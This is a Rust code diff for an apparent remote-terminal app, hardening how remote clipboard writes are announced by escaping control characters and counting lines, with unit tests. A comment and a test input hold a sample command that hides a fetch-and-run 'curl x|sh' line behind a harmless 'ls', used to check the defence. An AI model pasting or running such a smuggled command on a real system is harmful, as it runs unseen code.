@@ -791,10 +791,9 @@ impl App {
     /// A remote host (OSC 52 or VNC) wants to set the clipboard: allowed per preference, and always
     /// announced so a silent swap can't set up a paste into another shell.
     pub fn remote_clipboard(&mut self, text: &str) {
-        let first: String = text.lines().next().unwrap_or("").chars().take(60).collect();
         if self.s.prefs.allow_remote_clipboard {
             self.s.ctx.copy_text(text.into());
-            self.s.info(format!("Remote host set the clipboard: {first}"));
+            self.s.info(format!("Remote host set the clipboard: {}", clipboard_summary(text)));
         } else {
             self.s.info("Blocked a remote clipboard write (Settings → General to allow)");
         }
@@ -1075,5 +1074,24 @@ impl eframe::App for App {
             ctx.request_repaint();
         }
         let _ = ToastKind::Info;
+    }
+}
+
+/// How a remote clipboard write is announced: control characters made visible and the line
+/// count stated, so `ls\ncurl … | sh` can't pass for a harmless `ls`.
+fn clipboard_summary(text: &str) -> String {
+    let lines = text.lines().count();
+    let shown: String = text.chars().take(60).flat_map(|c| if c.is_control() { c.escape_debug().collect::<Vec<_>>() } else { vec![c] }).collect();
+    let more = if text.chars().count() > 60 { "…" } else { "" };
+    if lines > 1 { format!("{shown}{more} ({lines} lines)") } else { format!("{shown}{more}") }
+}
+
+#[cfg(test)]
+mod clipboard_tests {
+    #[test]
+    fn remote_clipboard_toast_shows_hidden_lines() {
+        assert_eq!(super::clipboard_summary("ls"), "ls");
+        assert_eq!(super::clipboard_summary("ls\ncurl x|sh\n"), "ls\\ncurl x|sh\\n (2 lines)");
+        assert!(super::clipboard_summary("a\x0fb").contains("\\u{f}"));
     }
 }
